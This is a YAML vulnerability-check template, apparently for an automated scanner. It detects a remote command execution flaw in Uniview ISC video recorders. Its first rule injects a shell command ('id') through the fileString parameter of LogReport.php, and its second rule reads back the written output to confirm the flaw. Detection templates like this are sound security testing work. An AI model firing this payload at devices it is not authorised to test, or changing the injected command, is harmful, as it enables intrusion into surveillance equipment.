expression: r0() && r1()
id: uniview-isc-logreport-php-rce
info:
  author: zan8in
  description: "\u6D59\u6C5F\u5B87\u89C6\u79D1\u6280 \u7F51\u7EDC\u89C6\u9891\u5F55\
    \u50CF\u673A ISC /Interface/LogReport/LogReport.php \u9875\u9762\uFF0CfileString\
    \ \u53C2\u6570\u8FC7\u6EE4\u4E0D\u4E25\u683C\uFF0C\u5BFC\u81F4\u653B\u51FB\u8005\
    \u53EF\u6267\u884C\u4EFB\u610F\u547D\u4EE4\napp=\"uniview-ISC\"\n"
  name: "\u6D59\u6C5F\u5B87\u89C6\u79D1\u6280 \u7F51\u7EDC\u89C6\u9891\u5F55\u50CF\
    \u673A ISC LogReport.php \u8FDC\u7A0B\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E"
  reference:
  - http://wiki.peiqi.tech/wiki/iot/%E5%AE%87%E8%A7%86%E7%A7%91%E6%8A%80/%E6%B5%99%E6%B1%9F%E5%AE%87%E8%A7%86%E7%A7%91%E6%8A%80%20%E7%BD%91%E7%BB%9C%E8%A7%86%E9%A2%91%E5%BD%95%E5%83%8F%E6%9C%BA%20ISC%20LogReport.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html
  severity: critical
rules:
  r0:
    expression: response.status == 200
    request:
      method: GET
      path: /Interface/LogReport/LogReport.php?action=execUpdate&fileString=x;id>{{randstr}}.txt
  r1:
    expression: response.status == 200 &&  "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
    request:
      method: GET
      path: /Interface/LogReport/{{randstr}}.txt
set:
  randstr: randomLowercase(22)
